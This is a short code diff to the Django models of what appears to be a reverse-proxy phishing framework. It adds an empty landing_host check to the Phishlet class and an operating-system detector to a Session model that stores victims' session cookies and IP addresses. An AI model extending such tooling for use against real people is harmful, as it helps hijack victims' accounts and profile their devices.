@@ -109,7 +109,13 @@ class Phishlet(models.Model):
         phishlet = self.data
         
         landing_host = phishlet.get('landing_host', '')
-        proxy_host = phishlet.get('proxy_domain', '')    
+        proxy_host = phishlet.get('proxy_domain', '')  
+
+        if landing_host == '':
+            return 'Error: landing_host is empty'  
+
+
+
         print(f"landing_host: {landing_host}, proxy_host: {proxy_host}")
         # check if landing_host is not having subdomain
         if '.' in landing_host:
@@ -255,9 +261,29 @@ class Session(models.Model):
     created = models.DateTimeField(default=timezone.now, editable=False)
     updated = models.DateTimeField(auto_now=True)
 
+
+
     class Meta:
         ordering = ["-created"]
         unique_together = ["session_cookie", "phishlet"]
+
+    def detect_os(self) -> str:
+        ua  = self.user_agent.lower()
+        if 'windows' in ua:
+            return 'Windows'
+
+        elif 'macintosh' in ua or 'mac os x' in ua:
+            return 'MacOS'
+        elif 'ubuntu' in ua:
+            return 'Ubuntu'
+        elif 'linux' in ua:
+            return 'Linux'
+        elif 'android' in ua:
+            return 'Android'
+        elif 'iphone' in ua or 'ipad' in ua:
+            return 'iOS'
+        else:
+            return 'Unknown'
 
     def __str__(self) -> str:
         return f"Session {self.id} - {self.phishlet.name} ({self.visitor_ip})"
